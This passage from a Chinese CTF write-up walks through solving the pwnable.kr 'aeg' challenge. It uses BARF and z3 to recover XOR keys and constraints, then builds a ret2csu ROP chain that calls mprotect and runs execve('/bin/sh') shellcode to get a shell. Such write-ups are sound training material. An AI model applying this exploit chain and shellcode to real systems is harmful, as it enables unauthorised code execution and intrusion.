<h3 id="得到加密部分所异或的值"><a href="#得到加密部分所异或的值" class="headerlink" title="得到加密部分所异或的值"></a>得到加密部分所异或的值</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( i &amp; <span class="number">1</span> )</span><br><span class="line">	byte_4767740[i] ^= <span class="number">0x44</span>u;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    byte_4767740[i] ^= <span class="number">0x7C</span>u;</span><br></pre></td></tr></table></figure>

<p>此处意为，index为奇数，就异或<code>0x44</code>，为偶数，就异或<code>0x7C</code></p>
<p>因为加密操作在for循环中，所以我们要保存一个退出for循环的branch</p>
<figure class="image-box">
                <a rel=pwnable.kr aeg自解 href="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200123151950205.png" title="image-20200123151950205" data-fancybox="images"><img src="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200123151950205.png" alt="image-20200123151950205" title class></a>
                <p>image-20200123151950205</p>
            </figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">block = find_block(not_taken_branch, basic_blocks)</span><br><span class="line">block = find_block(block.direct_branch, basic_blocks)</span><br><span class="line">not_taken_branch = block.not_taken_branch</span><br></pre></td></tr></table></figure>

<p>先找到异或加密的块：</p>
<p>由于全局只有这里一处存在<code>and</code>操作所以可以从<code>basic blocks</code>中搜索目标<code>and eax, 1</code>，就可以得到<code>xor</code>指令附近的块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> basic_blocks:</span><br><span class="line">    break_flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> instr <span class="keyword">in</span> b.instrs:</span><br><span class="line">        <span class="keyword">if</span> instr.mnemonic == <span class="string">'and'</span> <span class="keyword">and</span> instr.operands[<span class="number">0</span>].to_string() == <span class="string">'eax'</span> <span class="keyword">and</span> instr.operands[<span class="number">1</span>].to_string() == <span class="string">'0x1'</span>:</span><br><span class="line">            block = b</span><br><span class="line">            break_flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> break_flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这时找到的是这个块</p>
<figure class="image-box">
                <a rel=pwnable.kr aeg自解 href="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200123152338054.png" title="image-20200123152338054" data-fancybox="images"><img src="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200123152338054.png" alt="image-20200123152338054" title class></a>
                <p>image-20200123152338054</p>
            </figure>

<p>其<code>taken_branch</code>和<code>not_taken_branch</code>分别是对应奇数和偶数的操作，所以：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 奇数</span></span><br><span class="line">j_num = <span class="number">0</span></span><br><span class="line">taken_block = find_block(block.taken_branch, basic_blocks)</span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> taken_block.instrs:</span><br><span class="line">    <span class="keyword">if</span> instr.mnemonic == <span class="string">'xor'</span>:</span><br><span class="line">        s = instr.operands[<span class="number">1</span>].to_string()</span><br><span class="line">        idx = s.index(<span class="string">'0x'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ffffff'</span> <span class="keyword">in</span> s:</span><br><span class="line">            idx += <span class="number">8</span></span><br><span class="line">        j_num = int(instr.operands[<span class="number">1</span>].to_string()[idx:], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 偶数</span></span><br><span class="line">o_num = <span class="number">0</span></span><br><span class="line">not_taken_block = find_block(block.not_taken_branch, basic_blocks)</span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> not_taken_block.instrs:</span><br><span class="line">    <span class="keyword">if</span> instr.mnemonic == <span class="string">'xor'</span>:</span><br><span class="line">        s = instr.operands[<span class="number">1</span>].to_string()</span><br><span class="line">        idx = s.index(<span class="string">'0x'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ffffff'</span> <span class="keyword">in</span> s:</span><br><span class="line">            idx += <span class="number">8</span></span><br><span class="line">        o_num = int(instr.operands[<span class="number">1</span>].to_string()[idx:], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这里就得到了奇数和偶数分别对应的异或的值</p>
<h3 id="进入套娃函数sub-45658F0"><a href="#进入套娃函数sub-45658F0" class="headerlink" title="进入套娃函数sub_45658F0"></a>进入套娃函数<code>sub_45658F0</code></h3><p>通过之前保存的<code>not_taken_branch</code>得到该函数所在的块，第二个call就是目标函数的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">block = find_block(not_taken_branch, basic_blocks)</span><br><span class="line">call_num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> block.instrs:</span><br><span class="line">    <span class="keyword">if</span> instr.mnemonic == <span class="string">'call'</span>:</span><br><span class="line">        <span class="keyword">if</span> call_num == <span class="number">1</span>:</span><br><span class="line">            call_address = int(instr.operands[<span class="number">0</span>].to_string(), <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        call_num += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="指令分析"><a href="#指令分析" class="headerlink" title="指令分析"></a>指令分析</h3><p>这里就是重磅操作了，该类函数中，几乎存在的所有操作都需要分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000045658F0                 push    rbp</span><br><span class="line">.text:00000000045658F1                 mov     rbp, rsp</span><br><span class="line">.text:00000000045658F4                 sub     rsp, 10h</span><br><span class="line">.text:00000000045658F8                 mov     ecx, esi</span><br><span class="line">.text:00000000045658FA                 mov     eax, edx</span><br><span class="line">.text:00000000045658FC                 mov     [rbp+var_4], dil</span><br><span class="line">.text:0000000004565900                 mov     [rbp+var_8], cl</span><br><span class="line">.text:0000000004565903                 mov     [rbp+var_C], al</span><br><span class="line">.text:0000000004565906                 cmp     [rbp+var_4], 0E4h</span><br><span class="line">.text:000000000456590A                 jnz     short loc_456596F</span><br><span class="line">.text:000000000456590C                 movzx   eax, [rbp+var_4]</span><br><span class="line">.text:0000000004565910                 mov     edx, 2Bh</span><br><span class="line">.text:0000000004565915                 imul    eax, edx</span><br><span class="line">.text:0000000004565918                 sub     al, [rbp+var_8]</span><br><span class="line">.text:000000000456591B                 cmp     al, 2Eh</span><br><span class="line">.text:000000000456591D                 jnz     short loc_456596F</span><br><span class="line">.text:000000000456591F                 movzx   edx, [rbp+var_4]</span><br><span class="line">.text:0000000004565923                 mov     eax, edx</span><br><span class="line">.text:0000000004565925                 shl     eax, 3</span><br><span class="line">.text:0000000004565928                 add     eax, edx</span><br><span class="line">.text:000000000456592A                 shl     eax, 2</span><br><span class="line">.text:000000000456592D                 mov     ecx, eax</span><br><span class="line">.text:000000000456592F                 movzx   edx, [rbp+var_8]</span><br><span class="line">.text:0000000004565933                 mov     eax, edx</span><br><span class="line">.text:0000000004565935                 shl     eax, 2</span><br><span class="line">.text:0000000004565938                 add     eax, edx</span><br><span class="line">.text:000000000456593A                 shl     eax, 3</span><br><span class="line">.text:000000000456593D                 add     eax, edx</span><br><span class="line">.text:000000000456593F                 add     eax, ecx</span><br><span class="line">.text:0000000004565941                 sub     al, [rbp+var_C]</span><br><span class="line">.text:0000000004565944                 cmp     al, 62h</span><br><span class="line">.text:0000000004565946                 jnz     short loc_456596F</span><br><span class="line">.text:0000000004565948                 movzx   eax, cs:byte_4767745</span><br><span class="line">.text:000000000456594F                 movzx   edx, al</span><br><span class="line">.text:0000000004565952                 movzx   eax, cs:byte_4767744</span><br><span class="line">.text:0000000004565959                 movzx   ecx, al</span><br><span class="line">.text:000000000456595C                 movzx   eax, cs:byte_4767743</span><br><span class="line">.text:0000000004565963                 movzx   eax, al</span><br><span class="line">.text:0000000004565966                 mov     esi, ecx</span><br><span class="line">.text:0000000004565968                 mov     edi, eax</span><br><span class="line">.text:000000000456596A                 call    sub_4565870</span><br><span class="line">.text:000000000456596F</span><br><span class="line">.text:000000000456596F loc_456596F:                            ; CODE XREF: sub_45658F0+1A↑j</span><br><span class="line">.text:000000000456596F                                         ; sub_45658F0+2D↑j ...</span><br><span class="line">.text:000000000456596F                 nop</span><br><span class="line">.text:0000000004565970                 leave</span><br><span class="line">.text:0000000004565971                 retn</span><br></pre></td></tr></table></figure>

<p>我选择分析从第四条指令开始到第三个<code>jnz</code>之前的除去<code>jnz</code>的所有操作</p>
<h4 id="预备操作"><a href="#预备操作" class="headerlink" title="预备操作"></a>预备操作</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">to_to = &#123;<span class="string">'eax'</span>: <span class="string">'al'</span>, <span class="string">'ebx'</span>: <span class="string">'bl'</span>, <span class="string">'ecx'</span>: <span class="string">'cl'</span>, <span class="string">'edx'</span>: <span class="string">'dl'</span>, <span class="string">'edi'</span>: <span class="string">'dil'</span>&#125;</span><br><span class="line">tv = list(to_to.values())</span><br><span class="line">tk = list(to_to.keys())</span><br></pre></td></tr></table></figure>

<p>因为这里所有涉及的运算操作都是byte为单位的，eax和al在这里并无太大运算上的区别，所以在这里做一个映射，把<code>al</code>都看作<code>eax</code>，以此类推</p>
<h4 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h4><ul>
<li><p>生成一个<code>z3</code>的<code>Solver</code></p>
</li>
<li><p>分别生成<code>eax</code>等寄存器的8位的<code>BitVec</code></p>
</li>
<li><p>设置一个字典来保存各指令的参数的值</p>
</li>
<li><p>分析各条指令，分别对<code>mov movzx add sub shl imul lea call cmp</code>指令进行分析一般来说已足够。指令分析过程要先分析出源操作数和目标操作数，如果是寄存器或者类似于<code>[rbp-4]</code>之类的，将其视为一个变量名，并检查参数字典中是否有该变量。如果有，则取出作为操作数，如果无，则生成以变量名为名的8位<code>BitVec</code>，然后依据相应指令所做的操作进行运算</p>
</li>
<li><p>指令的操作类型非常有限，这就为我们的分析提供了非常有利的条件</p>
</li>
<li><p>遇到第三个jnz的时候，其后所有指令除了<code>call</code>以外全部跳过</p>
</li>
<li><p>分析到<code>call</code>的时候，取出<code>call</code>的地址，然后再来一轮针对该<code>call</code>的分析</p>
</li>
<li><p>分析到<code>memcpy</code>的时候，分析得到<code>dest</code>距离<code>rbp</code>的距离，存为变量size</p>
</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">ans = []</span><br><span class="line">size = <span class="number">0</span>	<span class="comment"># dest相对rbp的距离</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    s = Solver()</span><br><span class="line">    eax = BitVec(<span class="string">'eax'</span>, <span class="number">8</span>)</span><br><span class="line">    ebx = BitVec(<span class="string">'ebx'</span>, <span class="number">8</span>)</span><br><span class="line">    ecx = BitVec(<span class="string">'ecx'</span>, <span class="number">8</span>)</span><br><span class="line">    edx = BitVec(<span class="string">'edx'</span>, <span class="number">8</span>)</span><br><span class="line">    edi = BitVec(<span class="string">'edi'</span>, <span class="number">8</span>)</span><br><span class="line">    esi = BitVec(<span class="string">'esi'</span>, <span class="number">8</span>)</span><br><span class="line">    V = &#123;<span class="string">'eax'</span>: eax, <span class="string">'ebx'</span>: ebx, <span class="string">'ecx'</span>: ecx,</span><br><span class="line">         <span class="string">'edx'</span>: edx, <span class="string">'edi'</span>: edi, <span class="string">'esi'</span>: esi&#125;</span><br><span class="line">    log(<span class="string">"exec call"</span>, call_address)</span><br><span class="line">    cfg = barf.recover_cfg(start=call_address)</span><br><span class="line">    <span class="keyword">if</span> len(cfg.basic_blocks) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> instr <span class="keyword">in</span> cfg.basic_blocks[<span class="number">0</span>].instrs:</span><br><span class="line">            <span class="keyword">if</span> instr.mnemonic == <span class="string">'lea'</span>:</span><br><span class="line">                op2 = instr.operands[<span class="number">1</span>].to_string()</span><br><span class="line">                obj = re.search(<span class="string">r"\[(\S+)\]"</span>, op2)</span><br><span class="line">                s = obj.groups()[<span class="number">0</span>]</span><br><span class="line">                size = int(s.strip(<span class="string">' '</span>).split(<span class="string">'-'</span>)[<span class="number">1</span>], <span class="number">16</span>)+<span class="number">8</span></span><br><span class="line">        print(<span class="string">"[+] reach the target!"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    continue_flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> addr, asm_instr, reil_instrs <span class="keyword">in</span> barf.translate(cfg.start_address+<span class="number">8</span>, cfg.end_address):</span><br><span class="line">        <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'call'</span>:</span><br><span class="line">            <span class="keyword">if</span> isinstance(s.check(), z3.z3.CheckSatResult):</span><br><span class="line">                md = s.model()</span><br><span class="line">                print(md)</span><br><span class="line">                edi_val = md.eval(edi).as_long()</span><br><span class="line">                esi_val = md.eval(esi).as_long()</span><br><span class="line">                edx_val = md.eval(edx).as_long()</span><br><span class="line">                log(<span class="string">"found 0: "</span>, edi_val)</span><br><span class="line">                log(<span class="string">"found 1: "</span>, esi_val)</span><br><span class="line">                log(<span class="string">"found 2: "</span>, edx_val)</span><br><span class="line">                ans.append(edi_val)</span><br><span class="line">                ans.append(esi_val)</span><br><span class="line">                ans.append(edx_val)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">"[-] unsat!"</span>)</span><br><span class="line">            call_address = int(asm_instr.operands[<span class="number">0</span>].to_string(), <span class="number">16</span>)</span><br><span class="line">            s.reset()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> len(asm_instr.operands) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            op1 = asm_instr.operands[<span class="number">0</span>].to_string()</span><br><span class="line">            op2 = asm_instr.operands[<span class="number">1</span>].to_string()</span><br><span class="line">            <span class="keyword">if</span> op1 <span class="keyword">in</span> tv:</span><br><span class="line">                op1 = tk[tv.index(op1)]</span><br><span class="line">            <span class="keyword">if</span> op2 <span class="keyword">in</span> tv:</span><br><span class="line">                op2 = tk[tv.index(op2)]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'rip'</span> <span class="keyword">in</span> op2:</span><br><span class="line">                continue_flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> continue_flag:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            Sobj1 = re.search(<span class="string">r"\[(\S+)\]"</span>, op1)</span><br><span class="line">            <span class="keyword">if</span> is_num(op2):</span><br><span class="line">                var2_var = int(op2, <span class="number">16</span>)</span><br><span class="line">                V[op2] = var2_var</span><br><span class="line">                Sobj2 = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Sobj2 = re.search(<span class="string">r"\[(\S+)\]"</span>, op2)</span><br><span class="line">            <span class="keyword">if</span> Sobj1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                var1_name = op1</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var1_name = Sobj1.groups()[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> var1_name <span class="keyword">in</span> V.keys():</span><br><span class="line">                var1_var = V[var1_name]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var1_var = BitVec(var1_name, <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">if</span> Sobj2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                var2_name = op2</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var2_name = Sobj2.groups()[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> var2_name <span class="keyword">in</span> V.keys():</span><br><span class="line">                var2_var = V[var2_name]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                var2_var = BitVec(var2_name, <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'mov'</span> <span class="keyword">or</span> asm_instr.mnemonic == <span class="string">'movzx'</span>:</span><br><span class="line">                var1_var = var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'cmp'</span>:</span><br><span class="line">                s.add(var1_var == var2_var)</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'add'</span>:</span><br><span class="line">                var1_var += var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'sub'</span>:</span><br><span class="line">                var1_var -= var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'imul'</span>:</span><br><span class="line">                var1_var *= var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'shl'</span>:</span><br><span class="line">                var1_var &lt;&lt;= var2_var</span><br><span class="line">            <span class="keyword">if</span> asm_instr.mnemonic == <span class="string">'lea'</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'*'</span> <span class="keyword">in</span> var2_name:</span><br><span class="line">                    vs = var2_name.strip(<span class="string">' '</span>).split(<span class="string">'*'</span>)</span><br><span class="line">                    var2_name = vs[<span class="number">0</span>].replace(<span class="string">'r'</span>, <span class="string">'e'</span>)</span><br><span class="line">                    <span class="keyword">if</span> var2_name <span class="keyword">in</span> V.keys():</span><br><span class="line">                        var2_var = V[var2_name]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        var2_var = BitVec(var2_name, <span class="number">8</span>)</span><br><span class="line">                    var2_var *= int(vs[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'+'</span> <span class="keyword">in</span> var2_name:</span><br><span class="line">                    vs = var2_name.strip(<span class="string">' '</span>).split(<span class="string">'+'</span>)</span><br><span class="line">                    v1 = vs[<span class="number">0</span>].replace(<span class="string">'r'</span>, <span class="string">'e'</span>)</span><br><span class="line">                    v2 = vs[<span class="number">1</span>].replace(<span class="string">'r'</span>, <span class="string">'e'</span>)</span><br><span class="line">                    <span class="keyword">if</span> v1 <span class="keyword">in</span> tk:</span><br><span class="line">                        var1 = V[v1]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        var1 = int(v1, <span class="number">16</span>)</span><br><span class="line">                    <span class="keyword">if</span> v2 <span class="keyword">in</span> tk:</span><br><span class="line">                        var2 = V[v2]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        var2 = int(v2, <span class="number">16</span>)</span><br><span class="line">                    var2_var = var1</span><br><span class="line">                    var2_var += var2</span><br><span class="line">                var1_var = var2_var</span><br><span class="line">            V[var1_name] = var1_var</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>程序非常贴心地导入了mprotect</strong>，所以我们可以通过利用<code>mprotect</code>将加密后数据的地址所存在的页的属性变为<code>RWX</code>，然后跳入这里执行<code>shellcode</code>完成利用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(binary_name)</span><br><span class="line">gadget = <span class="string">''</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> ans]).ljust(len(ans)+size, <span class="string">'\x00'</span>)</span><br><span class="line">gadget += p64(init_addr1)</span><br><span class="line">gadget += csu(<span class="number">0</span>, <span class="number">1</span>, elf.got[<span class="string">'mprotect'</span>], <span class="number">7</span>, <span class="number">0x1000</span>, inp_address&amp;(~<span class="number">0xfff</span>))</span><br><span class="line">gadget += p64(init_addr2) + p64(<span class="number">0</span>)</span><br><span class="line">gadget += csu(<span class="number">0</span>, <span class="number">1</span>, inp_address+<span class="number">0x200</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">gadget += p64(init_addr2)</span><br><span class="line">gadget = gadget.ljust(<span class="number">0x200</span>, <span class="string">'\x00'</span>)</span><br><span class="line">gadget += p64(inp_address+<span class="number">0x208</span>)</span><br><span class="line">shellcode = <span class="string">"""</span></span><br><span class="line"><span class="string">    mov rdi, 0x0068732f6e69622f</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    lea rdi, [rsp]</span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, SYS_execve</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">gadget = gadget + shellcode</span><br></pre></td></tr></table></figure>

<p>最后不能忘了还要将<code>payload</code>解密，编码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(gadget)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">        c = hex(ord(gadget[i]) ^ j_num)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c = hex(ord(gadget[i]) ^ o_num)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">'0'</span>)</span><br><span class="line">    payload += c</span><br><span class="line">    </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>就可以<code>get shell</code>了</p>
<p>脚本在[Github]([<a href="https://github.com/DayJun/Blogs/blob/master/Articles/pwnable.kr%20aeg/aeg.py]" target="_blank" rel="noopener">https://github.com/DayJun/Blogs/blob/master/Articles/pwnable.kr%20aeg/aeg.py]</a>(<a href="https://github.com/DayJun/Blogs/blob/master/Articles/pwnable.kr" target="_blank" rel="noopener">https://github.com/DayJun/Blogs/blob/master/Articles/pwnable.kr</a> aeg/aeg.py))</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>做出这道题之前，本打算用angr来解题，但是由于对angr的API不熟悉，学习成本很大，因此改用我相对熟悉的barf来辅助分析，收获不算颇丰，但做出这道题挺舒服的</p>

        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2020-01-23T08:46:24.955Z" itemprop="dateUpdated">2020-01-23 16:46:24</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/2020/01/23/pwnable-kr-aeg自解/" target="_blank" rel="external">http://dayjun.top/2020/01/23/pwnable-kr-aeg自解/</a>
        
    </div>
    <footer>
        <a href="http://dayjun.top">
            <img src="/img/girl.jpg" alt="DaJun">
            DaJun
        </a>
    </footer>
</blockquote>

        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/aeg/">aeg</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2020/01/23/pwnable-kr-aeg自解/&title=《pwnable.kr aeg自解》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2020/01/23/pwnable-kr-aeg自解/&title=《pwnable.kr aeg自解》 — DaJun的Blog&source=最近想要学习自动化解题技术，于是选择了pwnable.kr的aeg一题进行学习" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
